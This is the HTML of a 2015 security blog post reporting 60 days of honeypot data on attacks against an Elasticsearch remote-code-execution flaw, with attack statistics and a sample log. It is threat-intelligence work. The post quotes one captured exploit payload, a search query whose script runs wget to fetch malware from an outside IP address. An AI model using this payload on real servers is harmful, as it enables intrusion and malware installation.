@@ -1,0 +1,400 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>60 Days of Watching Hackers Attack Elasticsearch - jordan-wright</title>
+  <meta name="author" content="Jordan">
+
+  
+  <meta name="description" content="Introduction Two months ago, one of my DigitalOcean instances started attacking another host with massive amounts of bogus traffic. I was notified &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://jordan-wright.github.io/blog/2015/05/11/60-days-of-watching-hackers-attack-elasticsearch">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/stylesheets/data-tables.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="jordan-wright" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="/stylesheets/blog.css" rel="stylesheet" media="screen, projection" type="text/css">
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/vivus/0.1.2/vivus.min.js"></script>
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-44718701-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">jordan-wright</a></h1>
+  
+    <h2>Security and Programming Blog</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:jordan-wright.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/contact">Contact</a></li>
+  <li><a href="/projects">Projects</a></li>
+  <li><a href="/blog">Blog</a></li>
+  <li><a href="http://raidersec.blogspot.com">Raidersec</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">60 Days of Watching Hackers Attack Elasticsearch</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-05-11T15:00:00-05:00" pubdate data-updated="true">May 11<span>th</span>, 2015</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://jordan-wright.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><img src="/images/headers/elk_results.png"/></p>
+
+<h3>Introduction</h3>
+
+<p>Two months ago, one of my DigitalOcean instances started attacking another host with massive amounts of bogus traffic. I was notified by the abuse team at DO that my VPS was participating in a DDoS attack. I managed to track down that the attackers leveraged an <a href="/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/">RCE vulnerability in Elasticsearch</a> to automatically download and run malware.</p>
+
+<p>After re-building the box from scratch (with many improvements!), I <a href="/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/">created a honeypot</a> called Elastichoney to measure how much this vulnerability is being exploited in the wild. Since then, I&rsquo;ve had multiple sensors silently logging all attempts to exploit this vulnerability.</p>
+
+<p>Here are the results.</p>
+
+<!--more-->
+
+
+<h3>Who&rsquo;s Attacking Me?</h3>
+
+<p><a href="https://github.com/jordan-wright/elastichoney">Elastichoney</a> keeps track of quite a bit of data, including the source IP and payload sent to the sensor. I logged every attack to an Elasticsearch instance (have some irony &ndash; free of charge!) and enriched the data with geoip information using Logstash. Finally, I created a slick dashboard using Kibana to view the results.</p>
+
+<p>So far, I&rsquo;ve had around 8k attempts to attack the honeypots from over 300 unique IP addresses. One of the immediate things I noticed was thing a vast majority (over 93%) of attacks were coming from Chinese IP addresses:</p>
+
+<p><img src="/images/blog/elastichoney_elk/map.png"/></p>
+
+<p>The second thing that I noticed was how fast the majority of exploit attempts died down. Here&rsquo;s a histogram of attack attempts since the sensors have been running:</p>
+
+<p><img src="/images/blog/elastichoney_elk/histogram.png"/></p>
+
+<p>You&rsquo;ll notice a spike between March 20<sup>th</sup> and April 11<sup>th</sup>. These attacks came from a few Chinese IP addresses that all stopped their attacks at the same time. But hey, attacks come in, attacks go out. <a href="http://cdn.meme.am/instances/500x/58834359.jpg">You can&rsquo;t explain that.</a></p>
+
+<h3>What are the Attackers Doing?</h3>
+
+<p>I mentioned that Elastichoney logs the payload sent to the sensor. In some cases, these were attempts to run boring commands like <code>whoami</code>, etc. However, in quite a few cases, the malware attempted to use <code>wget</code> to download and run malware &ndash; similar to what happened to my DO instance.</p>
+
+<p>These looked something like this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>source={"query":+{"filtered":+{"query":+{"match_all":+{}}}},+"script_fields":+{"exp":+{"script":+"import+java.util.*;import+java.io.*;String+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"wget+-O+/tmp/zuosyn+http://115.28.216.181:995/zuosyn\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}},+"size":+1}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>These malware samples were generally nothing more than basic bots. They could be compiled ELF binaries, or simple Perl scripts. While we&rsquo;re working to let Elastichoney automatically download these malware samples, for now the data is in the logs. Speaking of logs&hellip;</p>
+
+<h3>The Raw Data</h3>
+
+<p>I&rsquo;m a fan of open-sourcing as much information as possible if it helps the community. As such, I&rsquo;ve decided to release all the logs I currently have.</p>
+
+<p>You can download the raw JSON logs <a href="/downloads/elastichoney_logs.json.gz">here</a>. Here&rsquo;s an example log to show how the logs are structured:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+</pre></td><td class='code'><pre><code class='json'><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="nt">&quot;source&quot;</span><span class="p">:</span> <span class="s2">&quot;222.186.56.46&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;@timestamp&quot;</span><span class="p">:</span> <span class="s2">&quot;2015-05-10T15:44:56.803Z&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;url&quot;</span><span class="p">:</span> <span class="s2">&quot;x.x.x.x:9200/_search?&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;method&quot;</span><span class="p">:</span> <span class="s2">&quot;GET&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;form&quot;</span><span class="p">:</span> <span class="s2">&quot;form_payload&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;payload&quot;</span><span class="p">:</span> <span class="s2">&quot;json_payload&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;headers&quot;</span><span class="p">:</span> <span class="p">{</span>
+</span><span class='line'>        <span class="nt">&quot;user_agent&quot;</span><span class="p">:</span> <span class="s2">&quot;python-requests/2.4.1 CPython/2.7.8 Windows/2003Server&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;host&quot;</span><span class="p">:</span> <span class="s2">&quot;x.x.x.x:9200&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;content_type&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;accept_language&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span>
+</span><span class='line'>    <span class="p">},</span>
+</span><span class='line'>    <span class="nt">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;attack&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;honeypot&quot;</span><span class="p">:</span> <span class="s2">&quot;x.x.x.x&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;@version&quot;</span><span class="p">:</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;host&quot;</span><span class="p">:</span> <span class="s2">&quot;127.0.0.1:39642&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;Python Requests&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;os&quot;</span><span class="p">:</span> <span class="s2">&quot;Windows&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;os_name&quot;</span><span class="p">:</span> <span class="s2">&quot;Windows&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;device&quot;</span><span class="p">:</span> <span class="s2">&quot;Other&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;major&quot;</span><span class="p">:</span> <span class="s2">&quot;2&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;minor&quot;</span><span class="p">:</span> <span class="s2">&quot;4&quot;</span><span class="p">,</span>
+</span><span class='line'>    <span class="nt">&quot;geoip&quot;</span><span class="p">:</span> <span class="p">{</span>
+</span><span class='line'>        <span class="nt">&quot;ip&quot;</span><span class="p">:</span> <span class="s2">&quot;222.186.56.46&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;country_code2&quot;</span><span class="p">:</span> <span class="s2">&quot;CN&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;country_code3&quot;</span><span class="p">:</span> <span class="s2">&quot;CHN&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;country_name&quot;</span><span class="p">:</span> <span class="s2">&quot;China&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;continent_code&quot;</span><span class="p">:</span> <span class="s2">&quot;AS&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;region_name&quot;</span><span class="p">:</span> <span class="s2">&quot;04&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;city_name&quot;</span><span class="p">:</span> <span class="s2">&quot;Nanjing&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;latitude&quot;</span><span class="p">:</span> <span class="mf">32.0617</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;longitude&quot;</span><span class="p">:</span> <span class="mf">118.77780000000001</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;timezone&quot;</span><span class="p">:</span> <span class="s2">&quot;Asia/Shanghai&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;real_region_name&quot;</span><span class="p">:</span> <span class="s2">&quot;Jiangsu&quot;</span><span class="p">,</span>
+</span><span class='line'>        <span class="nt">&quot;location&quot;</span><span class="p">:</span> <span class="p">[</span><span class="mf">118.77780000000001</span><span class="p">,</span> <span class="mf">32.0617</span><span class="p">]</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As always, let me know if you have any questions or comments below!</p>
+
+<p>Enjoy!</p>
+
+<p>Jordan</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Jordan</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-05-11T15:00:00-05:00" pubdate data-updated="true">May 11<span>th</span>, 2015</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/elastichoney/'>elastichoney</a>, <a class='category' href='/blog/categories/elasticsearch/'>elasticsearch</a>, <a class='category' href='/blog/categories/honeypot/'>honeypot</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://jordan-wright.github.io/blog/2015/05/11/60-days-of-watching-hackers-attack-elasticsearch/" data-via="" data-counturl="http://jordan-wright.github.io/blog/2015/05/11/60-days-of-watching-hackers-attack-elasticsearch/" >Tweet</a>
+  
+  
+  <div class="g-plusone" data-size="medium"></div>
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/05/09/how-tor-works-part-two-relays-vs-bridges/" title="Previous Post: How Tor Works: Part Two - Relays vs. Bridges">&laquo; How Tor Works: Part Two - Relays vs. Bridges</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/05/11/60-days-of-watching-hackers-attack-elasticsearch/">60 Days of Watching Hackers Attack Elasticsearch</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/05/09/how-tor-works-part-two-relays-vs-bridges/">How Tor Works: Part Two - Relays vs. Bridges</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/">Introducing Elastichoney - an Elasticsearch Honeypot</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/">Remote Code Execution in Elasticsearch - CVE-2015-1427</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/02/28/how-tor-works-part-one/">How Tor Works: Part One</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Jordan -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span><span> Icons made by Freepik from <a href="http://www.flaticon.com" title="Flaticon">www.flaticon.com</a> is licensed by <a href="http://creativecommons.org/licenses/by/3.0/" title="Creative Commons BY 3.0">CC BY 3.0</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'jordan-wright';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://jordan-wright.github.io/blog/2015/05/11/60-days-of-watching-hackers-attack-elasticsearch/';
+        var disqus_url = 'http://jordan-wright.github.io/blog/2015/05/11/60-days-of-watching-hackers-attack-elasticsearch/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
+      script.src = 'https://apis.google.com/js/plusone.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
+    })();
+  </script>
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
